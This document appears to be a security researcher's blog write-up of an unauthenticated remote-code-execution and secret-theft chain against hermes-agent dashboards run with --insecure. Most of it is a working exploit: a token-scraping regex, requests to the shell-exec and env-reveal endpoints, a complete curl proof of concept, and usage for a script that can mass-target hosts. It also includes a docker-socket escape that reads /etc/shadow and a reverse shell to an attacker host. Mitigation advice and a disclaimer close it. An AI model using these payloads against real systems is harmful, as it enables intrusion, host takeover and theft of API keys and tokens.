# Hermes Agent: Unauthenticated RCE and Credential Theft

I was poking at NousResearch's `hermes-agent` and found that any instance running with the `--insecure` flag is fully owned over the network. No login, no CSRF token, no nothing. Just a session token sitting in plain HTML that the server happily accepts from any origin.

The end result is shell on the box (as root, if the operator was generous) and every API key in the environment dumped in plaintext. The default port is `9119` btw (in case you wanna know iykyk ;)).

## Is your instance vulnerable?

Only if you started it with `--insecure`.

That flag turns off the dashboard's auth gate. Once it's off, any request carrying the session token from the page HTML gets accepted, from any origin.

The fun part: the original Docker entrypoint silently appended `--insecure` whenever the bind host was not `127.0.0.1` or `localhost`. So every Docker deployment binding to `0.0.0.0` got the flag without the operator ever typing it.

They later changed it so you have to pass the flag explicitly. But every operator who binds to `0.0.0.0` still passes it, because the dashboard just refuses to start otherwise. So in practice it didn't really fix much (afaik).

## Why it happens

The dashboard ships with a JavaScript client that needs to talk to the backend API. To do that, the server bakes a session token directly into the HTML it serves:

```html
<script>
  window.__HERMES_SESSION_TOKEN__ = "abc123...";
</script>
```

The client reads that variable and uses it as a bearer token for every subsequent API call. That's fine when the server is behind real auth, because you'd never get to load the page in the first place without proving who you are.

With `--insecure`, there's no auth in front of the page. So anyone who can reach port `9119` can just `curl /` and read the token straight out of the response body. The backend then accepts that token on every protected endpoint, including the ones that run shell commands and reveal environment variables.

There's no origin check, no CSRF protection, no token binding to anything. The token is the auth.

## Exploit Chain

### Step 1: leak the session token

Just hit the root path:

```
GET / HTTP/1.1
Host: target:9119
```

The token is right there in the HTML. Pull it out with grep:

```bash
curl -s http://TARGET:9119/ | grep -oP '__HERMES_SESSION_TOKEN__\s*=\s*"\K[^"]+'
```

If `/` returns something weird (non-200), fall back to `/env`. Any SPA route that returns the index HTML works, because the token is baked into the bundle.

Regex used by the exploit script:

```text
__HERMES_SESSION_TOKEN__\s*=\s*"([^"]+)"
```

### Step 2: run shell commands

Once you have the token, the console exec endpoint will run anything you send it:

```
POST /api/plugins/hermes-internal/console/exec HTTP/1.1
Host: target:9119
Authorization: Bearer <token>
Content-Type: application/json

{"command": "id; uname -a; hostname"}
```

Response:

```json
{
  "stdout": "uid=10000(hermes) gid=10000(hermes) groups=10000(hermes)\nLinux ...\nhostname\n",
  "stderr": "",
  "exit_code": 0
}
```

Commands run through `child_process.exec` inside the container. The process is `uid 10000` (`hermes`) by default, but some operators run the container as `root` because the setup wizard literally asks them if they want to.

### Step 3: enumerate environment variables

```
GET /api/env HTTP/1.1
Host: target:9119
Authorization: Bearer <token>
```

This returns a JSON object listing every env var name that's set. It's basically a directory of secrets, with the values masked out. That's fine, the next endpoint will unmask them for you.

### Step 4: reveal the secret values

```
POST /api/env/reveal HTTP/1.1
Host: target:9119
Authorization: Bearer <token>
Content-Type: application/json

{"key": "ANTHROPIC_API_KEY"}
```

Response:

```json
{
  "key": "ANTHROPIC_API_KEY",
  "value": "sk-ant-api03-..."
}
```

This endpoint exists so the dashboard UI can show masked env vars when the operator clicks the little eye icon. Nice feature for the UI, terrible feature for anyone with the leaked token.

Just iterate through every key from step 3 and you walk away with every secret on the box.

## What you actually get out

Hermes is an AI agent dashboard, so the env is basically a wallet of expensive API keys. Here's what's typically sitting in there:

| key | what it unlocks |
|-----|-----------------|
| `ANTHROPIC_API_KEY` | Claude API |
| `OPENAI_API_KEY` | GPT API |
| `DEEPSEEK_API_KEY` | DeepSeek API |
| `GOOGLE_API_KEY` | Google Cloud / Gemini |
| `OPENROUTER_API_KEY` | multi-model API gateway |
| `GITHUB_TOKEN` | GitHub personal access token |
| `DISCORD_BOT_TOKEN` | Discord bot |
| `SLACK_BOT_TOKEN` | Slack workspace |
| `TELEGRAM_BOT_TOKEN` | Telegram bot |

Any one of these alone is a bad day. All of them at once is a very bad day. The GitHub token in particular can pivot into the operator's source code, CI secrets, and from there their whole infra.

## Going further: container escape

Once you have shell inside the container, check if the operator was kind enough to mount the docker socket:

```bash
ls -l /var/run/docker.sock
```

If that returns a socket, the host's docker daemon is reachable from inside the container. Game over for the host. Just spawn a privileged container that mounts the host root and chroot into it:

```bash
docker run --rm -v /:/host alpine sh -c 'chroot /host id; chroot /host cat /etc/shadow'
```

Or skip the messing around and grab a reverse shell on the host directly:

```bash
docker run --rm -v /:/host alpine chroot /host \
  /bin/sh -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
```

That breaks out of the hermes container entirely and gives you root on the bare metal.

Even if the docker socket isn't mounted, the in-container shell is enough to dump secrets, pivot to other internal services the container can reach, and use the box as a relay.

## Full curl PoC

This is the end-to-end exploit in seven lines of bash:

```bash
HOST="TARGET"
PORT="9119"

TOKEN=$(curl -s "http://${HOST}:${PORT}/" | grep -oP '__HERMES_SESSION_TOKEN__\s*=\s*"\K[^"]+')

curl -s -X POST "http://${HOST}:${PORT}/api/plugins/hermes-internal/console/exec" \
     -H "Authorization: Bearer ${TOKEN}" \
     -H "Content-Type: application/json" \
     -d '{"command":"id; uname -a"}'

curl -s -X POST "http://${HOST}:${PORT}/api/env/reveal" \
     -H "Authorization: Bearer ${TOKEN}" \
     -H "Content-Type: application/json" \
     -d '{"key":"ANTHROPIC_API_KEY"}'
```

## Exploit script

I wrote a small Python script (`exploit.py`) that automates the whole chain. Usage:

```bash
python3 exploit.py -u TARGET                 # just leak token + sanity check
python3 exploit.py -u TARGET -c 'id'         # run one command
python3 exploit.py -u TARGET -s              # interactive shell
python3 exploit.py -u TARGET -d              # dump every env var
python3 exploit.py -l targets.txt -d         # do the dump across a target list
```

The repo with the full script lives at [github.com/X3r0Day/Unauthenticated-Hermes-RCE](https://github.com/X3r0Day/Unauthenticated-Hermes-RCE).


## Impact

Pre-auth RCE plus full secret disclosure on a service that, by design, is full of expensive API keys and access tokens. No interaction needed. No prior access needed. One HTTP GET and you have the token, two more POSTs and you have shell and every key on the box.

If the operator runs the container as `root`, you have root in the container. If they also mounted the docker socket, you have root on the host. If the host has access to internal infra, you have a pivot.

And because the keys you steal are mostly LLM API keys with billing attached, you can also just burn money on the victim's tab. Which makes it even more terrifying 

## How to protect yourself

If you're running hermes-agent:

- Don't pass `--insecure`. If the dashboard refuses to start without it on `0.0.0.0`, then don't bind it to `0.0.0.0`. Put it behind a reverse proxy that handles auth, or bind it to loopback and tunnel in over SSH.
- Don't run the container as `root` just because the setup wizard offered it.
- Don't mount `/var/run/docker.sock` into the container unless you genuinely need it. You almost never do.
- Treat the env file like it's a password file, because it is.
- Rotate any API key that was ever loaded into a hermes instance reachable from the internet. Assume it's been pulled.

If you're shipping a self-hosted dashboard that needs an auth token in the page bundle, please don't pretend that token is auth. Put a real auth gate in front of the page itself, so an unauthenticated attacker can't fetch the HTML and read the token in the first place.

## References

- [github.com/NousResearch/hermes-agent](https://github.com/NousResearch/hermes-agent) (the affected project)
- [github.com/X3r0Day/Unauthenticated-Hermes-RCE](https://github.com/X3r0Day/Unauthenticated-Hermes-RCE) (PoC repo and Python exploit)

## Disclaimer

This writeup is for security research and authorized testing. Don't point the exploit script at boxes you don't own or don't have permission to test.
